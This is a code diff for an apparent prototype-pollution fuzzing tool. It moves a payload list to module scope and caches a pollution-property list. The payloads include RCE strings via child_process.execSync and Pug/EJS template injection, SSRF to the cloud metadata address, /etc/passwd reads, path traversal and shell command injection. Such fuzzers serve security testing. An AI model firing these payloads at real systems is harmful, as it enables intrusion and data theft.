@@ -35,6 +35,68 @@ const GENERIC_POLLUTION_PROPS = [
 ];
 
 /**
+ * Payload values designed to trigger different sink types. Hoisted to module
+ * scope and built once — it is a constant (its two callable members, the
+ * toString-coercion object and the function payload, are stateless and never
+ * mutated by callers, which only index into the array read-only). It was
+ * previously rebuilt on every call, i.e. every fuzzing iteration.
+ *
+ * Payloads are crafted to:
+ * 1. Reach code execution sinks (eval, Function, exec)
+ * 2. Be detectable in output (sentinel values)
+ * 3. Trigger type coercion edge cases
+ * 4. Match patterns template engines actually consume
+ */
+const PAYLOADS = [
+  // Sentinel value — detectable in output without being dangerous
+  { type: 'sentinel', value: '__UOPFUZZ_MARKER_7f3a__' },
+
+  // Code execution payloads for template engines (compile-time injection)
+  { type: 'rce_function', value: 'x]});process.mainModule.require("child_process").execSync("id");//' },
+  { type: 'rce_require', value: "require('child_process').execSync('id')" },
+  { type: 'rce_constructor', value: 'constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")' },
+
+  // Boolean/truthy — many gadgets check if (options.debug) etc
+  { type: 'boolean_true', value: true },
+  { type: 'boolean_string', value: '1' },
+
+  // Template injection payloads
+  { type: 'template_pug', value: '-var x = process.mainModule.require("child_process").execSync("id")' },
+  { type: 'template_ejs', value: '<%= process.mainModule.require("child_process").execSync("id") %>' },
+
+  // Object with toString — triggers type coercion
+  { type: 'coercion_tostring', value: { toString: () => '__UOPFUZZ_COERCED__' } },
+
+  // Function payload — if the library calls the polluted value
+  { type: 'function', value: function() { return '__UOPFUZZ_CALLED__'; } },
+
+  // Numeric payloads
+  { type: 'number', value: 1337 },
+  { type: 'zero', value: 0 },
+
+  // Null/undefined boundary
+  { type: 'empty_string', value: '' },
+  { type: 'null', value: null },
+
+  // SSRF — polluting url/href/src/proxy properties
+  { type: 'ssrf_url', value: 'http://169.254.169.254/latest/meta-data/' },
+  { type: 'ssrf_protocol', value: 'file:///etc/passwd' },
+
+  // Path traversal — polluting path/filename/basedir/cwd
+  { type: 'path_traversal', value: '../../../../../../etc/passwd' },
+
+  // Command injection — polluting shell/command/script
+  { type: 'cmd_injection', value: '; id #' },
+  { type: 'cmd_backtick', value: '`id`' },
+
+  // Array payload — triggers different code paths in merge/extend
+  { type: 'array', value: ['__UOPFUZZ_ARRAY__'] },
+
+  // Nested object — triggers recursive processing
+  { type: 'nested_object', value: { nested: { deep: '__UOPFUZZ_DEEP__' } } },
+];
+
+/**
  * Science-Based Input Generation Engine
  *
  * Implements coverage-guided input generation grounded in:
@@ -880,8 +942,20 @@ export class InputGeneration {
    * 3. Config-defined pollution points
    * 4. Generic cross-category properties
    * 5. Full known-gadget property database (all packages)
+   *
+   * Memoized: this concatenates + dedupes several large static lists
+   * (GENERIC_POLLUTION_PROPS + the full known-gadget DB) and was rebuilt on
+   * every fuzzing iteration via generatePollutionDescriptors. The only inputs
+   * that change within a run are the config (stable) and discoveredUOPProperties
+   * (grows), so we recompute only when the UOP set grows or the config changes.
    */
   getPollutionProperties(config) {
+    const uopSize = this.discoveredUOPProperties.size;
+    const cached = this._pollutionPropsCache;
+    if (cached && cached.config === config && cached.uopSize === uopSize) {
+      return cached.properties;
+    }
+
     const seen = new Set();
     const properties = [];
 
@@ -911,6 +985,7 @@ export class InputGeneration {
     // Low priority: comprehensive known-gadget property database (all packages)
     for (const prop of getKnownProperties()) addUnique(prop);
 
+    this._pollutionPropsCache = { config, uopSize, properties };
     return properties;
   }
 
@@ -924,54 +999,7 @@ export class InputGeneration {
    * 4. Match patterns template engines actually consume
    */
   getPayloads() {
-    return [
-      // Sentinel value — detectable in output without being dangerous
-      { type: 'sentinel', value: '__UOPFUZZ_MARKER_7f3a__' },
-
-      // Code execution payloads for template engines (compile-time injection)
-      { type: 'rce_function', value: 'x]});process.mainModule.require("child_process").execSync("id");//' },
-      { type: 'rce_require', value: "require('child_process').execSync('id')" },
-      { type: 'rce_constructor', value: 'constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")' },
-
-      // Boolean/truthy — many gadgets check if (options.debug) etc
-      { type: 'boolean_true', value: true },
-      { type: 'boolean_string', value: '1' },
-
-      // Template injection payloads
-      { type: 'template_pug', value: '-var x = process.mainModule.require("child_process").execSync("id")' },
-      { type: 'template_ejs', value: '<%= process.mainModule.require("child_process").execSync("id") %>' },
-
-      // Object with toString — triggers type coercion
-      { type: 'coercion_tostring', value: { toString: () => '__UOPFUZZ_COERCED__' } },
-
-      // Function payload — if the library calls the polluted value
-      { type: 'function', value: function() { return '__UOPFUZZ_CALLED__'; } },
-
-      // Numeric payloads
-      { type: 'number', value: 1337 },
-      { type: 'zero', value: 0 },
-
-      // Null/undefined boundary
-      { type: 'empty_string', value: '' },
-      { type: 'null', value: null },
-
-      // SSRF — polluting url/href/src/proxy properties
-      { type: 'ssrf_url', value: 'http://169.254.169.254/latest/meta-data/' },
-      { type: 'ssrf_protocol', value: 'file:///etc/passwd' },
-
-      // Path traversal — polluting path/filename/basedir/cwd
-      { type: 'path_traversal', value: '../../../../../../etc/passwd' },
-
-      // Command injection — polluting shell/command/script
-      { type: 'cmd_injection', value: '; id #' },
-      { type: 'cmd_backtick', value: '`id`' },
-
-      // Array payload — triggers different code paths in merge/extend
-      { type: 'array', value: ['__UOPFUZZ_ARRAY__'] },
-
-      // Nested object — triggers recursive processing
-      { type: 'nested_object', value: { nested: { deep: '__UOPFUZZ_DEEP__' } } },
-    ];
+    return PAYLOADS;
   }
 
   /**
